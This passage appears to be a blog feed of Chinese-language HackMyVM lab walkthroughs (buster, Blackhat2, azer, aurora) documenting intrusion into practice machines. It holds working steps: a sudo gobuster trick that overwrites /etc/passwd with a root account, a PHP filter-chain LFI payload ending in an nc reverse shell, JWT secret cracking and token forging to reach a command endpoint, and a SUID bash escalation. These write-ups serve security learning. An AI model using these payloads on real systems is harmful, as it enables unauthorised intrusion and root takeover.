    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on listen:
    (ALL) NOPASSWD: /usr/bin/gobuster

```

可以用**sudo**权限运行**gobuster**。网上一点资料都没有，唯一类似的是使用gobuster的扫描功能探测文本，但是我们这里不管用，因为`ta0`和`ll04567`两位大佬命名的flag不是`root.txt`，需要用到一点吊炸天的操作，由`ll04567`大佬提出，`ll04567、ta0、城南花已开、 fw`大佬们共同探索的`gobuster`提权技巧

```bash
# 攻击机
┌──(kali㉿kali)-[~/test]
└─$ perl -e 'print crypt('1','aa')'
aacFCuAIHhrCM  

┌──(kali㉿kali)-[~/test]
└─$ cat a.py               
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/&lt;path:path&gt;')
def catch_all(path):
    if len(path) == 36:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

                                      
┌──(kali㉿kali)-[~/test]
└─$ python3 a.py                 
 * Serving Flask app 'a'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.205.141:80
Press CTRL+C to quit

#靶机
$ echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' &gt; aaa
welcome@listen:~$ sudo /usr/bin/gobuster -w aaa -u http://192.168.205.141 -n -q -o /etc/passwd
/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash
welcome@listen:~$ cat /etc/passwd
/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash
welcome@listen:~$ su - /aaa
Password: 
/aaa@listen:~# id
uid=0(/aaa) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_buster.html</guid><pubDate>Fri, 27 Jun 2025 09:32:41 +0000</pubDate></item><item><title>hmv_Blackhat2</title><link>https://7r1UMPHK.github.io/post/hmv_Blackhat2.html</link><description># hmv_Blackhat2

**靶机**：[HackMyVM - Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)
**难度**：黄色
**目标 IP**：192.168.205.218
**本机 IP**：192.168.205.141

## 1. 端口枚举及服务探测

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 21:27 CST
Nmap scan report for 192.168.205.218
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
MAC Address: 08:00:27:17:26:A8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

从 `nmap` 扫描结果来看，目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。接下来，我们对 HTTP 服务进行进一步的目录爆破。

## 2. Web 服务探测与 PHP 过滤器链利用

通过使用 `gobuster` 进行目录爆破，找到了几个有用的路径：

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.218 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.218
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 996]
/index.php            (Status: 200) [Size: 996]
/.php                 (Status: 403) [Size: 280]
/news.php             (Status: 200) [Size: 3418]
/2021                 (Status: 200) [Size: 31875]
/2022                 (Status: 200) [Size: 34213]
/2023                 (Status: 200) [Size: 36067]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
```

* `/index.php` 和 `/index.html` 的文件大小相同，没有发现有用的信息。
* `/news.php` 页面要求输入一个邮箱地址。输入一个有效的邮箱后，可以访问到 `/2021`, `/2022`, `/2023` 等新闻页面。

不过，在 `/news.php` 页面中，URL 中有一个异常的地方，提示我们可以尝试利用 **LFI**（本地文件包含）漏洞。

## 3. 利用 PHP Filter 过滤器链

在尝试了 LFI 攻击后，我发现这个页面实际上是可以利用 **PHP 过滤器链** 来执行命令。经过一些思考后，我决定使用 [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) 来生成一个过滤器链。该工具帮助我们构建可以通过 `php://filter` 绕过 PHP 的安全限制并执行任意命令的链。

```bash
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/synacktiv/php_filter_chain_generator.git
正克隆到 'php_filter_chain_generator'...
...
```

然后，我使用生成的链条来获取反向 shell：

```bash
http://192.168.205.218/news.php?year=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc -e /bin/bash 192.168.205.141 8888
```

## 4. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

## 5. 提权

在系统中没有发现明显的提权点，但通过 `dpkg -V` 命令查看系统文件的完整性。

```bash
bash-5.2$ dpkg -V
missing   c /etc/apache2/sites-available/000-default.conf
missing   c /etc/apache2/sites-available/default-ssl.conf
??5?????? c /etc/grub.d/10_linux
??5??????   /usr/bin/chfn
```

发现 `/usr/bin/chfn` 被修改，且该文件可能存在提权漏洞。我们将它拖入ida分析一下，我们会发现如下命令字符串：

![image](https://github.com/user-attachments/assets/fe1370ad-f488-4462-a38d-69b1a5acdb3b)
这段字符串表示的是：

```bash
nohup /tmp/system &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;
```

`nohup`：nohup是一个POSIX命令，意思是“不挂断”
`/tmp/system`：恶意脚本

我们可以使用 `chfn` 命令修改 `/bin/bash` ,将它设成我们可以运行的权限，从而获得 root 权限。

```bash
bash-5.2$ vi system
bash-5.2$ cat system 
bash u+s /bin/bash
bash-5.2$ /usr/bin/chfn
Changing the user information for root
Enter the new value, or press ENTER for the default
        Full Name [root]: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
bash-5.2$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
bash-5.2$ bash -p
bash-5.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

通过此方式，成功获得了 root 权限。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Blackhat2.html</guid><pubDate>Fri, 27 Jun 2025 09:32:37 +0000</pubDate></item><item><title>hmv_azer</title><link>https://7r1UMPHK.github.io/post/hmv_azer.html</link><description># hmv_azer

# 0.简介

**靶机**：[hackmyvm - azer](https://hackmyvm.eu/machines/machine.php?vm=Azer)
**难度**：绿色
**目标 IP**：192.168.205.235
**本机 IP**：192.168.205.141

---

# 1.扫描

使用 `Nmap` 进行初步端口扫描，以识别开放的服务和端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.235
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 11:19 CST
Nmap scan report for 192.168.205.235
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:07:E9:02 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
                                                           
```

结果显示两个开放端口：

**80/tcp** - HTTP 服务
**3000/tcp** - 原始显示为 PPP，但实际上是一个 web 应用程序，用于用户认证

---

# 2.踩点

`80`端口页没有发现明显利用点，踩点`3000`端口

![image](https://github.com/user-attachments/assets/3b565e9c-e8cd-41ae-bf84-0cf6e7460d2e)

![image](https://github.com/user-attachments/assets/f2dcad05-b377-43e6-aa7b-159b04935536)

![image](https://github.com/user-attachments/assets/9ab7e04b-b4c3-4d36-9fdf-b4d1c827bf98)

在进一步探索中发现，**3000** 端口的应用程序似乎通过执行 `.sh` 脚本来进行密码验证。利用这一特性，成功绕过了**密码验证**，并建立了**反弹 Shell**。

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.235] 46566
bash: cannot set terminal process group (483): Inappropriate ioctl for device
bash: no job control in this shell
azer@azer:~$ id
id
uid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)

```

---

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.提权

```bash
azer@azer:~$ hostname -I
192.168.205.235 10.10.10.1 172.17.0.1 

azer@azer:~$ ./fscan -h 10.10.10.1/24 -no -np -nopoc

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
10.10.10.1:80 open
10.10.10.10:80 open

```

`-np` 跳过存活检测
`-no` 不保存文件
`-nopoc` 跳过web poc扫描

通过扫描内部网络发现了另一个 IP `10.10.10.10` 正在运行 **HTTP** 服务。

```bash
azer@azer:~$ nc 10.10.10.10 80
Hello
HTTP/1.1 400 Bad Request
Date: Wed, 08 Jan 2025 05:03:33 GMT
Server: Apache/2.4.58 (Unix)
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Bad Request&lt;/h1&gt;
&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
azer@azer:~$ curl 10.10.10.10
.:.AzerBulbul.:.
```

访问该服务时，得到了一个看起来像密码的字符串。

```bash
azer@azer:~$ su -
Password: 
root@azer:~# id
uid=0(root) gid=0(root) groups=0(root)

```

成功提权至 rootsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_azer.html</guid><pubDate>Fri, 27 Jun 2025 09:32:35 +0000</pubDate></item><item><title>hmv_aurora</title><link>https://7r1UMPHK.github.io/post/hmv_aurora.html</link><description># hmv_aurora

# 0.简介

**靶机**：[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST
Nmap scan report for 192.168.205.138
Host is up (0.00044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

**3000**大概率是**web**页面

# 2.踩点

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

禁止`GET`访问，那我们就`POST`

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u 'http://192.168.205.138:3000' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
401     POST        1l        2w       22c http://192.168.205.138:3000/login
400     POST        1l        6w       29c http://192.168.205.138:3000/register
401     POST        1l        2w       22c http://192.168.205.138:3000/Login
400     POST        1l        6w       29c http://192.168.205.138:3000/Register
401     POST        1l        1w       12c http://192.168.205.138:3000/execute

```

使用`curl`访问

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/login -X POST
Identifiants invalides                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST
The 'role' field is not valid                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST 
Unauthorized                                                                                                                                    

```

我们注册一个用户试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'admin\'}'
Not authorized !
```

啊这，丢去`WFUZZ`爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://192.168.205.138:3000/register' -X POST -H 'Content-Type: application/json' -d '{\'role\':\'FUZZ\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/register
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   401        0 L      3 W        16 Ch       'admin'                                                             
000000022:   500        0 L      5 W        32 Ch       'user'                                                              

Total time: 58.91045
Processed Requests: 62284
Filtered Requests: 62282
Requests/sec.: 1057.265

```

继续注册

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\'}' 
Column 'username' cannot be null                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\'}'
Column 'password' cannot be null                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
Registration OK                                                                                                                                     
```

去登录试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/login -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
{'accessToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA'}
```

这很`jwt`，去尝试解码，[网站](https://jwt.io/)

![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)

将密钥爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' &gt; hash
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
nopassword       (?)   
1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```

改一下参数

![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)

尝试一下那个`execute`

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk'
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The &amp;quot;file&amp;quot; argument must be of type string. Received undefined&lt;br&gt; &amp;nbsp; &amp;nbsp;at validateString (internal/validators.js:120:11)&lt;br&gt; &amp;nbsp; &amp;nbsp;at normalizeSpawnArguments (child_process.js:411:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at spawn (child_process.js:547:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.execFile (child_process.js:237:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at exec (child_process.js:158:25)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:69:3&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:112:5&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

`Authorization` 头以 `Bearer` 开头。报错了，提示 '`file` 参数应该是一个字符串，接收到了 `undefined`'。根据它的名字和报错我们可以猜出该网页应该是用来执行命令的，我们`wfuzz`一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://192.168.205.138:3000/execute' -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{\'FUZZ\':\'id\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 63
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/execute
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000008958:   200        1 L      3 W        54 Ch       'command'                                                           
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 19.47640
Processed Requests: 13025
Filtered Requests: 13024
Requests/sec.: 668.7578

```

尝试执行一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{'command':'id'}'  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

弹个shell回来

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{'command':'nc 192.168.205.141 8888 -e /bin/bash'}' 
```

卡住了，卡住就对了

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888          
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 43824
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@aurora:~$ ls -la
total 124
drwxr-xr-x   3 www-data www-data  4096 Apr  6  2023 .
drwxr-xr-x   3 root     root      4096 Mar  1  2023 ..
-rw-r--r--   1 www-data www-data  3271 Mar  1  2023 app.js
-rw-r--r--   1 www-data www-data  3169 Mar  2  2023 app.js.save
-rw-------   1 www-data www-data   153 Apr  6  2023 .bash_history
drwxr-xr-x 127 www-data www-data  4096 Mar  1  2023 node_modules
-rw-r--r--   1 www-data www-data   399 Mar  1  2023 package.json
-rw-r--r--   1 www-data www-data 95944 Mar  1  2023 package-lock.json
www-data@aurora:~$ cat .bash_history
clear
cd /home/doro/
clear
sudo -l
/usr/bin/python3 /home/doro/tools.py --ping
sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
clear
crontab -l
www-data@aurora:~$ sudo -l
Matching Defaults entries for www-data on aurora:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on aurora:
    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
www-data@aurora:~$ cat /home/doro/tools.py
import os
import sys

def main():
    if len(sys.argv) &lt; 2:
        print_help()
        return
  
    option = sys.argv[1]
    if option == '--ping':
        ping()
    elif option == '--traceroute':
        traceroute_ip()
    else:
        print('Invalid option.')
        print_help()

def print_help():
    print('Usage: python3 network_tool.py &lt;option&gt;')
    print('Options:')
    print('--ping           Ping an IP address')
    print('--traceroute     Perform a traceroute on an IP address')

def ping():
    ip_address = input('Enter an IP address: ')

    forbidden_chars = ['&amp;', ';', '(', ')', '||', '|', '&gt;', '&lt;', '*', '?']
    for char in forbidden_chars:
        if char in ip_address:
            print('Forbidden character found: {}'.format(char))
            sys.exit(1)
  
    os.system('ping -c 2 ' + ip_address)

def traceroute_ip():
    ip_address = input('Enter an IP address: ')

    if not is_valid_ip(ip_address):
        print('Invalid IP address.')
        return
  
    traceroute_command = 'traceroute {}'.format(ip_address)
    os.system(traceroute_command)

def is_valid_ip(ip_address):
    octets = ip_address.split('.')
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or int(octet) &lt; 0 or int(octet) &gt; 255:
            return False
    return True

if __name__ == '__main__':
    main()
www-data@aurora:~$ ls -la /home/doro/
total 36
drwxr-xr-x 4 doro doro 4096 Mar  8  2023 .
drwxr-xr-x 3 root root 4096 Mar  6  2023 ..
lrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout
-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc
drwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local
-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile
drwx------ 2 doro doro 4096 Mar  4  2023 .ssh
-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py
-rwx------ 1 doro doro   33 Mar  3  2023 user.txt

```

